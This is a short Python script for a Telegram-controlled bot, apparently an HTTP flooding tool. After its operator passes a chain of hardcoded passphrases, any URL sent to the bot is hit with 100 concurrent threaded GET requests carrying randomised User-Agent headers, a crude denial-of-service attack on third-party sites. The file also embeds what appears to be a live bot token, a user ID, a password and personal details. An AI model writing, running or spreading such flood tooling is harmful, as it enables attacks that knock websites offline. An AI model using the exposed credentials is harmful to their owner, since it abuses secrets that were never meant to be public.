import os, time, requests, threading, random

TOKEN = "8536346083:AAGYUDR6cd7hI9_41_gNbQdREbBb6Dn_9v4"
MASTER_ID = 1938591484

class SovereignMaster:
    def __init__(self, t):
        self.t, self.f, self.r, self.u = t, {}, False, f"https://api.telegram.org/bot{t}"
        self._s(MASTER_ID, "🔱 **ONLINE**")

    def _s(self, c, x):
        try: requests.post(f"{self.u}/sendMessage", json={'chat_id': c, 'text': x, 'parse_mode': 'Markdown'})
        except: pass

    def _boost(self, url):
        self._s(MASTER_ID, "🚀 **INJECTING...**")
        for _ in range(100): threading.Thread(target=lambda: requests.get(url, headers={'User-Agent': str(random.random())}), daemon=True).start()

    def listen(self):
        o = 0
        while True:
            try:
                up = requests.get(f"{self.u}/getUpdates?offset={o}&timeout=10").json()
                for u in up.get('result', []):
                    o = u['update_id'] + 1
                    m = u.get('message', {}); uid = m.get('from', {}).get('id'); tx = m.get('text', '')
                    if uid != MASTER_ID: continue
                    st = self.f.get(uid, 0)
                    if st < 4: self.f[uid] = st + 1
                    elif st == 4:
                        if "ariful islam pappu 2000" in tx.lower(): self._s(uid, "🔱 **২০০০?**"); self.f[uid] = 5
                        else: self.f[uid] = 0
                    elif st == 5:
                        if "জামালপুর" in tx: self._s(uid, "🛡️ **KEY?**"); self.f[uid] = 6
                        else: self.f[uid] = 0
                    elif st == 6:
                        if tx == "Aip2k3052": self.f[uid] = "ROOT"; self.r = True; self._s(uid, "👑 **READY**")
                        else: self.f[uid] = 0
                    elif self.r and "http" in tx: self._boost(tx)
            except: pass
            time.sleep(1)

if __name__ == "__main__":
    SovereignMaster(TOKEN).listen()
    
